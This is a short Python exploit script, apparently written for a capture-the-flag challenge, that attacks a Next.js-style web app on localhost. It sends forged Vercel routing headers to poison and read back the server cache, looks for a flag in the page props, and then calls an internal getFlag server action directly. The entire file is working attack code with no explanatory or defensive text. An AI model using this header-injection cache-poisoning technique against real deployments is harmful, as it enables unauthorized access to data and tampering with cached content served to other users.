import requests

def exploit_cache_poisoning(target_url):
    # Headers to exploit cache poisoning
    headers = {
        'x-matched-path': '/_next/data/build-id/index.json',
        'x-now-route-matches': '1=index',
        'x-vercel-id': 'cit1::random-id',
        'accept': 'application/json'
    }

    # First request to poison the cache
    print("Sending first request to poison the cache...")
    response = requests.get(target_url, headers=headers)
    print(f"Status: {response.status_code}")
    print(f"Headers: {response.headers}")

    # Second request to retrieve potentially cached content
    print("\nSending second request to retrieve cached content...")
    response = requests.get(target_url, headers=headers)
    print(f"Status: {response.status_code}")
    print(f"Headers: {response.headers}")
    
    try:
        json_data = response.json()
        if 'props' in json_data and 'pageProps' in json_data['props']:
            print("\nResponse data:")
            print(json_data['props']['pageProps'])
            if 'message' in json_data['props']['pageProps']:
                print(f"\nPotential flag found: {json_data['props']['pageProps']['message']}")
    except ValueError:
        print("\nResponse is not JSON. Content:")
        print(response.text[:500])  # Print first 500 characters

    # If the above doesn't work, try to directly invoke the server action
    print("\nAttempting to directly invoke server action...")
    action_url = f"{target_url}/api/getFlag"
    action_headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
    }
    action_data = {
        "id": "actions.getFlag",
        "args": []
    }
    response = requests.post(action_url, json=action_data, headers=action_headers)
    print(f"Status: {response.status_code}")
    print(f"Headers: {response.headers}")
    print("Response:")
    print(response.text)

# Replace with the actual target URL
target_url = 'http://localhost:8081'

exploit_cache_poisoning(target_url)